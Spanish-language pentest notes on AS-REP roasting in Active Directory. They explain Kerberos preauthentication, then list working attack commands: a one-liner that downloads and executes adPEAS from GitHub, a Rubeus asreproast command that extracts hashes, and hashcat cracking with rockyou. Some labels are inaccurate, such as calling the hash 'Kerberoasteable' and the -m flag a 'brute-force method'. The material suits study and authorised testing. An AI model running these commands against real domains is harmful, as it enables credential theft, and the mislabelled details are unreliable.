# ASREProstable 

Tags: #AD #ASREProstable #Rubeus #HashCat #Windows #Powershell 

El "KRB_AS_REP Roasting" es un ataque dirigido a cuentas en dominios de Active Directory (AD) que tienen habilitada la opción "No requiere preautenticación de Kerberos". Esta configuración permite a un atacante solicitar un ticket de autenticación (AS-REP) sin proporcionar una preautenticación válida. El atacante puede capturar este ticket y descifrarlo fuera de línea para intentar recuperar las contraseñas en texto claro de las cuentas afectadas. Este método explota configuraciones inseguras y puede ser mitigado desactivando dicha propiedad en las cuentas y aplicando contraseñas fuertes junto con políticas de monitoreo.

* [CVE-2022-33679](https://infayer.com/archivos/1661)

```bash 
1. Preautenticación de Kerberos: Normalmente, Kerberos requiere que un usuario proporcione no solo su nombre de usuario sino también su contraseña para obtener un ticket TGT (Ticket Granting Ticket) durante el proceso de autenticación inicial (AS-REQ). Esta es una medida de seguridad diseñada para prevenir ataques de tipo "offline" en los que se intenta adivinar las contraseñas.
    
2. Cuentas sin Preautenticación: Sin embargo, en algunos casos, esta propiedad puede estar deshabilitada para ciertas cuentas debido a necesidades de compatibilidad o configuraciones erróneas. Esto significa que el KDC (Key Distribution Center) enviará la respuesta (AS-REP) que contiene el TGT cifrado sin requerir una prueba válida de conocimiento de la contraseña del usuario.

# Funcionamiento 

1. Enumeración de Usuarios: Un atacante primero enumerará las cuentas de usuario que tienen deshabilitada la preautenticación de Kerberos.
    
2. Solicitud de TGT: Luego, el atacante puede enviar una solicitud AS-REQ para esas cuentas y el KDC responderá con un AS-REP que contiene el TGT cifrado usando la contraseña del usuario.
    
3. Ataque Offline: A diferencia de un ataque de fuerza bruta online, el atacante puede ahora intentar descifrar el TGT offline, utilizando herramientas de cracking de contraseñas para adivinar la contraseña sin alertar al sistema o bloquear la cuenta de usuario.
```

## Obtener Hash con ADPeas

```bash 
# Ejemplo de un hash 'Kerberoasteable'
❯ $krb5asrep$23$asrep.user@domain1.corp:0939461A3CF12B34FC2EEDE8C8154E15$55613643FA62AB315871CFD2D3...

Nota: 
	1. Guardar el Hash en una sola linea en un documento .txt
```

* [ADPeas](https://github.com/61106960/adPEAS)

```powershell 
❯ IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/61106960/adPEAS/main/adPEAS.ps1')

❯ Invoke-adPEAS    # Módulo para hacer la enumeración automatizada
```

## Rubeus

```bash 
1. Solicitar Tickets Kerberos (TGTs): Rubeus puede solicitar Ticket Granting Tickets (TGTs) utilizando contraseñas, hashes o incluso claves.
    
2. Kerberoasting: Rubeus es capaz de solicitar Ticket Granting Service (TGS) tickets para cuentas de servicio y luego intentar descifrar estos tickets fuera de línea para obtener contraseñas en texto claro, una técnica conocida como Kerberoasting.
    
3. Overpass (Pass-the-Ticket): Rubeus puede realizar ataques de "Overpass", donde los TGTs son utilizados para autenticarse en otros sistemas sin conocer la contraseña del usuario.
    
4. Ticket Renewal: Puede renovar tickets válidos que aún estén dentro de su período de renovación.
    
5. Dumping Tickets: Rubeus puede extraer tickets de la memoria y almacenarlos para su uso o análisis posterior.
    
6. Manipulación de Tickets: Puede purgar, renovar e incluso falsificar tickets de Kerberos.
    
7. Hunting de Tickets: Rubeus puede buscar en la red tickets específicos que proporcionen acceso a ciertos recursos o que posean ciertos privilegios.
    
8. Ataques de Fuerza Bruta: Puede intentar fuerza bruta contra cuentas de usuario con el objetivo de obtener un TGT.
```

* [Rubeus](https://github.com/GhostPack/Rubeus)

```powershell
❯ .\Rubeus.exe asreproast /user:asrep.user /format:hashcat /outfile:hashes.asreproast 

	# user = Usuario vulnerable
	# outfile = Exportar a un archivo 

Nota:
	1. Al finalizar crea un archivo en 'C:\Users\admin\Desktop\hashes.asreproast' donde se encuentra el hash asreproast
```

## Crackear el Hash obtenido 

```bash 
# Guardar y crackear el hash con 'Hashcat'
❯ hashcat -m 18200 hashes.asreproast /usr/share/wordlists/rockyou.txt --force

	# m = Método por fuerza bruta
	# 18200 = Es un ASREProstable
	# hashes.asreproast = Archivo que contiene el hash 
	# rockyou = Diccionario a usar 
```